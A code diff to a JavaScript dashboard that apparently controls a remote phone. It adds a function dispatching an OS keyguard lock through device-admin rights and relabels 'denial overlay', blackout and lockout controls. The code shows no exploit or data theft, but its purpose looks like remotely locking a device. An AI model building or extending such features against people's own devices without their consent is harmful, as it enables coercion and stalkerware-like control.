@@ -927,9 +927,23 @@ function terminateOverlay() {
 
 function toggleLock() {
   fetch("/ghost/lock").then(() => {
-    showToast("Uplink command sent: SYSTEM_LOCK");
+    showToast("Uplink command sent: DENIAL_OVERLAY");
     checkGhostStatus();
   });
+}
+
+function triggerOsLock() {
+  showToast("DISPATCHING_OS_KEYGUARD_LOCK...");
+  fetch("/ghost/interact?action=os_lock")
+    .then(r => r.json())
+    .then(d => {
+      if (d.success) {
+        showToast("OS_PHONE_LOCK_DISPATCHED");
+      } else {
+        showToast(d.error || "DEVICE_ADMIN_NOT_ACTIVE", "error");
+      }
+    })
+    .catch(() => showToast("LOCK_DISPATCH_FAILED", "error"));
 }
 
 function toggleBlackout() {
@@ -1217,11 +1231,11 @@ async function checkGhostStatus() {
 
       if (lockBtn) {
         if (data.lock) {
-          lockBtn.innerHTML = "RELEASE_LOCK";
+          lockBtn.innerHTML = "Unlock";
           lockBtn.style.borderColor = "var(--neon-green)";
           lockBtn.style.color = "var(--neon-green)";
         } else {
-          lockBtn.innerHTML = "DEPLOY_LOCK";
+          lockBtn.innerHTML = "Lockout";
           lockBtn.style.borderColor = "var(--danger)";
           lockBtn.style.color = "var(--danger)";
         }
